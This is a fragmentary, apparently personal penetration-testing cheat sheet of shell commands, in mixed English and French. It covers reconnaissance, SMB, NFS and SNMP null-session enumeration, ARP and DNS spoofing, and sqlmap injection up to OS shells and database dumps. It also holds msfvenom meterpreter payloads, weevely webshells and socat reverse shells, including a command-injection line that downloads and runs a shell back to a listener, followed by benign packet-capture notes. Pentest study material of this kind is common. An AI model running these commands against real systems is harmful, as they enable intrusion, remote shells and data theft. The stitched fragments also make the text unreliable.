	curl -s https://crt.sh\?q\=%25.$1 | awk '/\?id=[0-9]*/{nr[NR]; nr[NR+1]; nr[NR+3]; nr[NR+4]}; NR in nr' | sed 's/<TD style="text-align:center"><A href="?id=//g' | sed 's#">[0-9]*</A></TD>##g' | sed 's#<TD style="text-align:center">##g' | sed 's#</TD>##g' | sed 's#<TD>##g' | sed 's#<A style=["a-z: ?=0-9-]*>##g' | sed 's#</A>##g' | sed 's/,/;/g' | sed 'N;N;N;s/\n/,/g' | sed 's/,[ ]*/,/g' | sed 's/^[ ]*//g' >> $1.csv
}










Raccoon -  Reconnaissance and information Gathering:
##-=================================================-##



URL Fuzzing + Dir / File Detection

Subdomain Enumeration
URL fuzzing and dir/file detection
Subdomain enumeration



--dns-records TEXT         Comma separated DNS records to query.
                                 Defaults to: A,MX,NS,CNAME,SOA,TXT
  --tor-routing                  Route HTTP traffic through Tor (uses port


--subdomain-list TEXT          Path to subdomain list file that would be
                                 used for enumeration
  -sc, --scripts                 Run Nmap scan with -sC flag
  -sv, --services                Run Nmap scan with -sV flag
  -f, --full-scan                Run Nmap scan with both -sV and -sC


--follow-redirects        Follow redirects when fuzzing. Default: False
--tls-port INTEGER             Use this port for TLS queries. Default: 443
--outdir TEXT              Directory destination for scan output








##-========================================-##
##    [+] 
##-========================================-##
sublist3r -d $Domain

sublist3r --verbose --domain mullvad.net


##-========================================-##
##    [+] 
##-========================================-##
subfinder -d $Domain -t 100 -v


Running httpx with subfinder

subfinder -d $Domain | httpx -title -tech-detect -status-code -title -follow-redirects


echo www.example.com | waybackurls
echo $Domain | waybackurls | httpx -status-code


dirbuster

gobuster dir -u https://example.com -w wordlist.txt
recursebuster -u https://example.com -w wordlist.txt



##-========================================-##
##    [+] 
##-========================================-##
httprobe
httprobe -s -p https:443


##-========================================-##
##    [+] Harvesting subdomains with assetfinder.
##-========================================-##
assetfinder $Domain | grep '.$Domain' | sort -u | tee -a $Domain/recon/final1.txt



amass enum -config /path/to/config.ini -passive -o amass_subs.txt -d "$scope"




##-===================================-##
##    [+] Double checking for subdomains 
##    [+] with amass and certspotter.
##-===================================-##
amass enum -d $Domain | tee -a $Domain/recon/final1.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$Domain | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u


##-=========================================-##
##     [+] Typical parameters for DNS enumeration:
##-=========================================-##
amass enum -v -src -ip -brute -min-for-recursive 2 -d $Domain



##-==============================================-##
##     [+] Importing OWASP Amass Results into Maltego
##-==============================================-##


##-=====================================-##
##     [+] Convert the Amass data 
##     [+] into a Maltego graph table CSV file:
##-=====================================-##
amass viz -maltego




##-=====================================-##
##     [+] 
##-=====================================-##
amass intel -d $Domain -whois


##-=====================================-##
##     [+] performed a reverse Whois search

https://viewdns.info/reversewhois/?q=$Domain

##-=====================================-##
##   [+] 
##-=====================================-##
amass intel -org '$OrgName'


##-=====================================-##
##   [+] 
##-=====================================-##
amass intel -active -asn $ASN -ip


amass net -cidr 192.168.1.0/24 -p 80,443,8080

amass enum -src -brute -min-for-recursive 4 -d example.com




amass enum -src -min-for-recursive 2 -ip -brute -public-dns -d <redacted>.com -o amass_brute_<redacted>.txt





masscan -p 443 -sS -Pn -n --randomize-hosts -v $line > file.txt

masscan -p-65535 $(dig +short example.com) --rate 10000





autorecon
smuggler



certspotter | tee -a $url/recon/final1.txt
sort -u $url/recon/final1.txt >> $url/recon/final.txt

subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> $url/recon/potential_takeovers/potential_takeovers1.txt


echo "[*] Pulling plugins data on $Domain $(date +'%Y-%m-%d %T') "
whatweb --info-plugins -t 50 -v $Domain >> $url/recon/whatweb/$domain/plugins.txt; sleep 3


echo "[*] Running whatweb on $domain $(date +'%Y-%m-%d %T')"
whatweb -t 50 -v $Domain >> $url/recon/whatweb/$domain/output.txt; sleep 3


echo "[+] Scraping wayback data..."
cat $url/recon/final.txt | waybackurls | tee -a  $url/recon/wayback/wayback_output1.txt
sort -u $url/recon/wayback/wayback_output1.txt >> $url/recon/wayback/wayback_output.txt


echo "[+] Scanning for open ports..."
nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt
 
echo "[+] Running eyewitness against all compiled domains..."
EyeWitness --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve



EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https



php /pentest/web/inurlbr/inurlbr.php --dork 'filetype:jsp | filetype:bak | filetype:asp | filetype:php | filetype:cgi | filetype:sql | filetype:pl | filetype:py | filetype:aspx | filetype:rb | filetype:do' inurl:'$TARGET' site:'$TARGET'' -s $TARGET-extensions.txt
php /pentest/web/inurlbr/inurlbr.php --dork '(inurl:"redir=" AND inurl:"http") OR (inurl:"url=" AND inurl:"http") OR (inurl:"target=" AND inurl:"http") OR (inurl:"dst=" AND inurl:"http") OR (inurl:"src=" AND inurl:"http") OR (inurl:"redirect=" AND inurl:"http") AND site:'"$TARGET" -s $TARGET-openredirect.txt
php /pentest/web/inurlbr/inurlbr.php --dork "'site:pastbin.com' $TARGET" -s $TARGET-pastebin.txt





massdns -r lists/resolvers.txt -t A -q -o S domains.txt
 | awk '{split($0,a," "); print a[3]}' | sort | uniq


massdns -s 1000 -t A -o S -r resolvers.txt --flush -w  ../dir${domain}/result_${domain}_${i}.txt



produce list of IP addresses corresponding to the target's FQDNs.

massdns -r lists/resolvers.txt -t A -q -o S domains.txt
| awk '{split($0,a," "); print a[3]}'
| sort
| uniq


massdns -r lists/resolvers.txt -t CNAME all.txt -o S > results.txt


subbrute.py /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt $DOMAIN | massdns -r ./resolvers.txt -w $DOMAIN.massdns.jhaddix.txt -t A -o S




altdns -l ~/urls.txt -o output.txt

altdns -i ../dir$domain/domains.txt -o ../dir$domain/altdns_data_output.txt  -r -s ../dir$domain/altdns_domains.txt



https://whois.arin.net/ui/query.do
https://apps.db.ripe.net/db-web-ui/#/fulltextsearch



Censys
ip:64.233.160.0/19
autonomous_system.asn:15169
autonomous_system.organization:"Google Inc."

https://censys.io/ipv4?q=443.https.tls.certificate.parsed.subject.organizational_unit%3A+COMPANY


Shodan
search specified IP range
net:64.233.160.0/19

filter based on the organization in WHOIS database
org:"Google"



https://www.shodan.io/search?query=org%3a%22COMPANY%22
https://www.shodan.io/search?query=ssl%3a%22COMPANY%22
https://www.shodan.io/search?query=ssl%3a%22COMPANY%22+http.component%3A%22Drupal%22
https://www.shodan.io/search?query=ssl%3a%22COMPANY%22+http.title%3A%22login%22
https://www.shodan.io/search?query=http.favicon.hash:81586312



##-=============================================-##
##   [+] Find Apache servers in San Francisco:
##-=============================================-##
apache city:"San Francisco"

##-=====================================-##
##   [+] Find Nginx servers in Germany:
##-=====================================-##
nginx country:"DE"

##-=============================================-##
##   [+] Find GWS (Google Web Server) servers:
##-=============================================-##
"Server: gws" hostname:"google"

##-==================================================-##
##   [+] Find Cisco devices on a particular subnet:
##-==================================================-##
cisco net:"216.219.143.0/24"





## ---------------------------------------------------------------- ##
##    [?]  Fierce is a DNS Enumeration tool
## ---------------------------------------------------------------- ##
fierce -dns $Domain

fierce -dns $dns -threads $threads -file $name

fierce -range $IPRange -dnsserver $Server




## --------------------------------------------------------------------------------------------- ##
##    [?]  Dnswalk is a DNS debugger. 
##    [?]  It performs zone transfers of specified domains
## --------------------------------------------------------------------------------------------- ##
dnswalk -r -d $domain


## --------------------------------------------------------------------------------------------- ##
##    [?]  dnstracer - allows you to see the “path” a request takes 
##          to get the authoritative answers for your domain.
## --------------------------------------------------------------------------------------------- ##
dnstracer -v -o $domain








dig -t axfr @<serveur dns> $Domain

##-==========================-##
##    [+] Zone Transfer
##-==========================-##
nmap -n -Pn -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja

nmap -sSVC -O -p- -v --open -oA nmap-output <target>

##-==========================-##
##    [+] Active Reconnaissance:
##-==========================-##
sudo nmap -sSVC -p- -A -T4 -vvv -n <IP_target> -oA <file_output>



bittwist
bustle-pcap
capstats
fprobe
libnet-pcaputils-perl



links2 -dump http://www.ip-tracker.org/locator/ip-lookup.php?ip=$target > domin.txt


links2 -dump startpage.com/do/dsearch?query=host%3Alinkedin.com+"$target"

links2 -dump https://duckduckgo.com/?q=site%3Abadoo.com+%22"$target"%22+%22$userc%22

links2 -dump google.fr/search?q=site:

links2 -dump https://twitter.com/search?q=

links2 -http.fake-user-agent "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3" -dump 

links2 -http.fake-user-agent "Mozilla/5.0 (X11; FreeBSD amd64; rv:26.0) Gecko/20100101 Firefox/26.0" -ssl.certificates 0 -dump startpage.com/do/dsearch?query=$target+"@gmail.com"

links2 -http.fake-user-agent "Mozilla/5.0 (X11; FreeBSD amd64; rv:27.0) Gecko/20100101 Firefox/27.0" -ssl.certificates 0 -dump startpage.com/do/dsearch?query=host%3A$target+"@yahoo.com"

links2 -http.fake-user-agent "Mozilla/5.0 (X11; FreeBSD amd64; rv:30.0) Gecko/20100101 Firefox/30.0" -ssl.certificates 0 -dump startpage.com/do/dsearch?query=$target

links2 -http.fake-user-agent "Mozilla/5.0 (X11; FreeBSD amd64; rv:26.0) Gecko/20100101 Firefox/26.0" -ssl.certificates 0 -dump google.it/search?q=$target+"@gmail.com"

links2 -http.fake-user-agent "Mozilla/5.0 (X11; FreeBSD amd64; rv:26.0) Gecko/20100101 Firefox/27.0" -ssl.certificates 0 -dump google.de/search?q=$target

links2 -http.fake-user-agent "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36." -ssl.certificates 0 -dump google.nl/search?q=$target




sendemail -f $secm -t $targetm -u $soggetto -m $messaggio -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpu" -xp "$smtpk"



##-=================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-=================================================-##
##   		[+] Samba - Discovery + Enumeration + Pentesting
##-=================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-=================================================-##


# Fingerprint version
smbclient -L //$TARGET

# TODO
nmblookup -A $TARGET

# null Session
rpcclient -v "" $TARGET
smbclient -L //$TARGET

# Minimal Scan
enum4linux $TARGET

# Scan Everything
enum4linux -a $TARGET


enum4linux-ng.py 192.168.125.145 -A -C
enum4linux-ng.py -As 

# discover windows/samba on subnet find macs and netbios name/domain
nbtscan 192.168.1.0/24

# Find open shares
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
Showmount -e $TARGET/<port>

# Investigate share
smblookup -A $TARGET smbclient //MOUNT/share -I $TARGET -N

# Enumerate users
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.0/24
python /usr/share/doc/python-impacket-doc/examples/samrdump.py $TARGET

nmap -p 111,2049 --script nfs-ls,nfs-showmount

# RID Cycling (500 = admin, 501 = Guest)
ridenum.py $TARGET 500 50000 /path/to/wordlist.txt

# NBTScan-Unixwiz
nbtscan-unixwiz -f $TARGET

# Mount Linux/Windows
mount $TARGET:/vol/share /mnt/nfs
Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””
C:\>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no


##  Mount Remote Windows Share:
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw


 Get a list of all browsable Samba shares on the target server.
smbclient -L sambaserver 




git clone https://github.com/cddmp/enum4linux-ng
docker build enum4linux-ng --tag enum4linux-ng

## ----------------------------------------------------------------------------------- ##
##   [?] Once finished an example run could look like this:
## ----------------------------------------------------------------------------------- ##
docker run -t enum4linux-ng -As <target>




 | xargs -I IP iptables -A INPUT -s IP -j DROP
















##-====================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-====================================-##
##   		[+] RPC - Remote Procedure Call
##-====================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-====================================-##


##-==================-##
##    [+] Find NFS Port
##-==================-##
nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port > $ip


##-=====================-##
##    [+] Services Running
##-=====================-##
rpcinfo –p > $ip $ rpcbind -p rpcinfo –p x.x.x.x


##-==============================-##
##    [+] Null Session/User Rpc login
##-==============================-##
rpcclient -U "" > $ip
	srvinfo
	enumdomusers
	enumprivs
	enumalsgroups domain
	lookupnames administrators
	querydominfo
	enumdomusers
	queryuser john


##-====================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-====================================-##
##   			[+] NFS - Network FileSystem
##-====================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-====================================-##


##  [+] Show Mountable NFS Shares
nmap --script=nfs-showmount -oN mountable_shares


##  [+] 
Rpcinfo -p $TARGET


##  [+] show logged in users/addresses
nbtscan $TARGET -R 54


##  [+] RDP
rdesktop -u admin -p password $TARGET



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SNMP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##  [+] Enmerate users from SNMP
snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $TARGET

##  [+] Search SNMP with nmap
nmap -sT -p 161 192.168.1.0/24 -oG snmp_results.txt

##  [+] Examples
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
onesixtyone -c community -I $TARGET
snmpcheck -t $TARGET
snmpenum -t $TARGET




onesixtyone -i $line -o ../dir${domain}/snmponesixtyone_output.txt
onesixtyone -c /usr/share/sparta/wordlists/snmp-default.txt -o snmp_one_sixtyone${2}.txt

##  [+] Version3
nmap -sV -p 161 --script=snmp-info 192.168.1.0/24

##  [+] Wordlists
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt


##  [+] SNMP ENumeration:

snmpget -v 1 -c public IP version
snmpwalk -v 1 -c public IP
snmpbulkwalk -v 2 -c public IP





##  [+] ARP Cache Poisoning
arpspoof -t <ip victime> <ip gateway> -r
arpspoof -i <interface (eth0)> <ip gateway>


##  [+] Bettercap (ARP Cache Poisoning)
bettercap -X --proxy -O bettercap.log

 DNS spoof with ettercap (etter.dns configured) 
ettercap -i wlan0 -T -q -P dns_spoof -M ARP:remote // //



On Kali (listen):
socat file:'tty',raw,echo=0 tcp-listen:4444  


On Victim (launch):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  


command injection:
socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  





sshuttle --dns -vvr user@server 0/0




nikto -h <target>
nikto -h "$1":"$port"

Webshell PHP avec Weevely :
weevely generate <password> <fichier_webshell>
weevely <url vers notre webshell> <password>



-----------------------------HTTP SERVICES----------------------------------

8. HTTP Service Information
Gather page titles from HTTP services
- nmap --script=http-title 192.168.1.0/24

Get HTTP headers of web services
- nmap --script=http-headers 192.168.1.0/24

Find web apps from known paths
- nmap --script=http-enum 192.168.1.0/24










nmap -sU --script=ms-sql-info $TARGET






##-=========================-##
##    [+] Targeted sqlmap scan
##-=========================-##
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump


##-=========================================================-##
##    [+] Scan url for union + error based injection with mysql backend 
##         use a random user agent + database dump 
##-=========================================================-##
sqlmap -o -u http://$ip/index.php --forms --dbs
sqlmap -o -u "http://$ip/form/" --forms


##-==================================-##
##    [+] Sqlmap check form for injection  
##-==================================-##
sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump


##-========================-##
##    [+] Enumerate databases  
##-========================-##
sqlmap --dbms=mysql -u "$URL" --dbs


##-=========================================-##
##    [+] Enumerate tables from a specific database  
##-=========================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables


##-================================================-##
##    [+] Dump table data from a specific database and table  
##-================================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump


##-==============================-##
##    [+] Specify parameter to exploit     
##-==============================-##
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2


##-=======================================================-##
##    [+] Specify parameter to exploit in 'nice' URIs (exploits param1)
##-=======================================================-##
 sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs


##-=================-##
##    [+] Get OS shell  
##-=================-##
sqlmap --dbms=mysql -u "$URL" --os-shell


##-==================-##
##    [+] Get SQL shell  
##-==================-##
sqlmap --dbms=mysql -u "$URL" --sql-shell


##-===============-##
##    [+] SQL query  
##-===============-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"


##-=========================-##
##    [+] Use Tor Socks5 proxy
##-=========================-##
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs



##-==========================-##
##    [+] Automated sqlmap scan
##-==========================-##
sqlmap -u http://site.com--forms --batch --crawl=2 --cookie= --level=5 --risk=3

##-=====================================-##
##    [+] Test URL and POST data
##    [+] Return database banner (if possible)
##-=====================================-##
sqlmap --url="<url>" --data="<post-data>" --banner

##-=============================-##
##    [+] Parse request data and test
##-=============================-##
## -------------------------------------------------------------------- ##
##    [?] request data can be obtained with burp
## -------------------------------------------------------------------- ##
sqlmap -u <request-file> <options>

##-======================-##
##    [+] Use random agent 
##-======================-##
sqlmap -u <request-file> --random-agent

##-===============================================-##
##    [+] Fingerprint | much more information than banner
##-===============================================-##
sqlmap -u <request-file> --fingerprint

##-=================-##
##    [+] Identify WAF
##-=================-##
sqlmap -u <request-file> --check-waf/--identify

##-============================================-##
##    [+] Get database username, name, and hostname
##-============================================-##
sqlmap -u <request-file> --current-user --current-db --hostname

##-==================================-##
##    [+] Check if user is a database admin
##-==================================-##
sqlmap -u <request-file> --is-dba

##-=========================================-##
##    [+] Get database users and password hashes
##-=========================================-##
sqlmap -u <request-file> --users --passwords

##-========================-##
##    [+] Enumerate databases
##-========================-##
sqlmap -u <request-file> --dbs

##-=============================-##
##    [+] List tables for one database
##-=============================-##
sqlmap -u <request-file> -D <db-name> --tables

##-============================-##
##    [+] Other database commands
##-============================-##
sqlmap -u <request-file> -D <db-name> --columns --schema --count

##-=====================-##
##    [+] Enumeration flags
##-=====================-##
sqlmap -u <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>

##-================-##
##    [+] Extract data
##-================-##
sqlmap -u <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump

##-======================-##
##    [+] Execute SQL Query
##-======================-##
sqlmap -u <request-file> --sql-query="<sql-query>"

##-===============================-##
##    [+] Append/Prepend SQL Queries
##-===============================-##
sqlmap -u <request-file> --prefix="<sql-query>" --suffix="<sql-query>"

##-======================================================-##
##   [+] Get backdoor access to sql server | can give shell access
##-======================================================-##
sqlmap -u <request-file> --os-shell




##-====================================================================================-##
##   [+] sqlmap post-request - captured request via Burp Proxy via Save Item to File.
##-====================================================================================-##
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10



sqlmap -r <fichier contenant la requête> : permet d'identifier si un paramètre est vulnérable
sqlmap -r <fichier contenant la requête> --dump





payload reverse_tcp en PHP + se mettre en écoute
msfvenom -p php/meterpreter_reverse_tcp LHOST=<votre IP> LPORT=<votre port d'écoute> -o <fichier_php_reverse_tcp.php>
msfconsole -x "use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set  LHOST=<votre IP>;set LPORT=<votre port d'écoute>;run"






ifconfig -a | egrep -e "(^eth|drop)"								## Linux, interface drop counts:
ethtool -S eth0 | egrep '(rx_missed|no_buffer)'			## Drop Values
awk '{ print $1, $5 }' /proc/net/dev								## Drop counts through /proc/ Virtual net
ifconfig -a | grep -E '(^eth|RX.*dropped)'
ethtool -S eth0 | egrep '(rx_missed|no_buffer)'


## Get max RX size for monitored interface
MAX_RX=$(ethtool -g eth0 | grep -m 1 RX | cut -d\: -f2 | awk '{sub(/^[ \t]+/, "")};1')


autoneg off

--show-priv-flags
--show-channels
--show-rxfh-indir
--show-time-stamping
--get-dump

rx on                   ## Specifies whether RX checksumming should be enabled.

tx on                   ## Specifies whether TX checksumming should be enabled.
rxhash on               ## Specifies whether receive hashing offload should be enabled

ifpps eth0
ifpps --promisc --dev eth0
ifpps --loop -p --csv -d wlan0 > $File.dat



### PCAP statistical data

capinfos $File.pcap
tcpslice -r $File.pcap
tcpdstat $File.pcap
tcpprof -S lipn -P 30000 -r $File.pcap



### Network Forensics - File Extraction

tcpdump -nni eth0 -w $File.pcap port 80 &
wget http://upload.wikimedia.org/wikipedia/en/5/55/Bsd_daemon.jpg
jobs
kill %1
tcpflow -r $File.pcap
tcpxtract -f $File.pcap -o xtract/


tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"


### Session & Flow Data

iftop -i $File.pcap // live only, replay for same effect




##  [?] use -i instead of -r for interface

tcpflow -c -e -r $File.pcap 'tcp and port (80 or 443)'
tcpflow -r $File.pcap tcp and port \(80 or 443\)
tcpick -r $File.pcap -C -yP -h 'port (25 or 587)'


##  [-wRu] write both flows; 
##  [-wRC] write client flows only
##  [-wRS] write server flows only


tcpick -r $File.pcap -wRu 




### Replay

tcpreplay -M10 -i eth0 $File.pcap
netsniff-ng --in file.pcap --out eth0
netsniff-ng --in eth0.pcap --out eth1.pcap
trafgen --dev eth0 --conf trafgen.txf --bind-cpu 0




PACKET HOST for a packet addressed to the local host
netsniff-ng --in eth0 --host

PACKET BROADCAST for a physical layer broadcast packet
$ netsniff-ng --in eth0 --broadcast
PACKET MULTICAST for a packet sent to a physical layer
multicast address
$ netsniff-ng --in eth0 --multicast
PACKET OTHERHOST for a packet to some other host that
has been caught by a device driver in promiscuous mode
$ netsniff-ng --in eth0 --others
PACKET OUTGOING for a packet originated from the local
host that is looped back to a packet socket
$ netsniff-ng --in eth0 --outgoing

Full content, daily packet capture. Excels at this.
$ netsniff-ng --in eth1 --out /pcaps/ --silent
--ring-size 2GiB --prio-high --interval 24hrs
Capture multiple raw 802.11 traffic pcap files, each 1GiB
$ netsniff-ng -i wlan0 -o raw.pcap --rfraw -s
--interval 1GiB --bind-cpu 0
Replay interface to interface
$ netsniff-ng --in eth0 --out eth1 --type host
--kernel-pull 100 --mmap -s -b 3

Apply BPF filter
netsniff-ng -i eth0 -f 'tcp and port 22'
netsniff-ng -i eth0 -f filter.bpf
netsniff-ng -i eth0 icmp


ifpps –dev eth0



sar -l 5 5
sar -L 5 5



watch -n 1 "cat /proc/net/dev | column -t"          ## ## Reads kernel stats from procfs, e.g.




ntop -d -L -u ntop –access-log-file=/var/log/ntop/access.log -b -C –output-packet-path=/var/log/ntop-
suspicious.log –local-subnets 192.168.1.0/24,192.168.2.0/24,192.168.3.0/24 -o -M -p
/etc/ntop/protocol.list -i br0,eth0,eth1,eth2,eth3,eth4,eth5 -o /var/log/ntop




##-=====================================-##
##     [+] Listen to TCP traffic on eth0 device
##-=====================================-##
sudo ngrep -d 'eth0' -W byline -t -q '^(GET|POST|PUT|HEAD|CONNECT) '



ngrep -q 'HTTP' 'tcp'							## Filter Out TCP Packets
ngrep -q 'HTTP' 'udp'							## Filter Out UDP Packets
ngrep -q 'HTTP' 'icmp'							## Filter Out ICMP Packets
ngrep -q 'HTTP' 'host 192.168'			## matches all headers containing the string 'HTTP' sent to or from the ip address starting with 192.168
ngrep -q 'HTTP' 'dst host 192.168'		## match a destination host
ngrep -q 'HTTP' 'src host 192.168'		## match a source host
ngrep -q 'HTTP' 'port 80'						## match a port




##-=======================================-##
##     [+] Sniff packets with live verbose output 
##     [+] Timestamps
##     [+] Hexadecimal values 
##     [+] ASCII strings
##-=======================================-##
ngrep -t -x 'USER|PASS|RETR|STOR' tcp port ftp and host server.example.com






ngrep -I bad_user.pcap -q -W single -t "GET" ip src 192.168.1.1 | awk
'{ print $2, $3, $11, $9}' | sed 's/\.\{1,3\}User-Agent//' | grep -v -E '(ad|
cache|analytics|wxdata|voicefive|imwx|weather.com|counterpath|
cloudfront|2mdn.net|click|api|acuity|tribal|pixel|touchofclass|flickr|
ytimg|pulse|twitter|facebook|graphic|revsci|digi|rss|cdn|brightcove|
atdmt|btrll|metric|content|trend|serv|content|global|fwmrm|typekit|[az]*-[a-z]*\.com|pinit|cisco|tumblr)' | sed '/ [ \t]*$/d' > url.txt








## To monitor all TCP ports, use a more general expression:
urlsnarf -i eth0 tcp


urlsnarf tcp port $Port




# Nikto
nikto -h http://INSERTIPADDRESS
nikto -h "$1":"$port"


# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444



# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check for title and all links
curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq


See where a shortened url takes you before click
check(){ curl -sI $1 | sed -n 's/Location: *//p';}


Download all files from podcast RSS feed
curl http://url/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c
curl http://pswonly.swsgtv.libsynpro.com/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c




curl -d {\"key\":\"value\"} -H "Content-Type: application/json" -X POST "http://localhost:3000/myendpoint"


  },
  "headers": {
    "x-forwarded-proto": "https",
    "host": "postman-echo.com",
    "content-length": "2054",
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "curl/7.60.0",
    "x-forwarded-port": "443"
  },



 | xxd -pu | tr -d '\n') \

[subfuzion]-Curl-POST-Examples.md

[subfuzion]-Curl-POST-Examples.md


 curl POST-examples


## ASN  API
curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt












### Tcpdump

tcpdump -i any -s0 -w $File.pcap
tcpdump -i eth0 -w $File -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X




darkstat --verbose -i eth0 --hexdump --export ~/$File.txt


tail ‐n 500 /var/log/messages
tail /var/log/warn
tail -f /var/log/messages
tail /var/log/messages |grep ICMP |tail -n 1
tail /var/log/messages | grep UDP | tail -n 1


cat /var/log/messages | grep DHCP






capinfos $File.pcap


tcp.port == 8443
tcp.port == 443



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 tcp
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 port 22
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w $File.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pcap     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pcap     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pcap                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pcap                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##



##-=================-##
##  [+] TCPDump
##-=================-##


##-=================-##
##  [+] Dump all
##-=================-##
tcpdump
	
	
##-=======================================-##
##  [+] Dump 5 Packets

tcpdump -c 5
	
	
##-============================-##
##  [+] Dump in ASCii format
##-============================-##
tcpdump -A
	
	
##-=======================================-##
##  [+] Dump in hexadecimal format
##-=======================================-##
tcpdump -xx
	
	
##-=======================================-##
##  [+] Dump from an specific interface
##-=======================================-##
tcpdump -i $IFACE
	
	
##-=======================================-##
##  [+] Dump from a specific port
##-=======================================-##
tcpdump port $PORT


	
## ---------------------------------------------------- ##
##   [?] -i $IFACE   ## Listen on all interfaces
##   [?] -c 5        ## Dump 5 packets
##   [?] -xx         ## Use hexadecimal
##   [?] -i $IFACE   ## Using $IFACE interface 
##   [?] port $PORT  ## Using $PORT port 
## ---------------------------------------------------- ##
tcpdump -c 5 -xx -i $IFACE port $PORT



##-====================================================-##
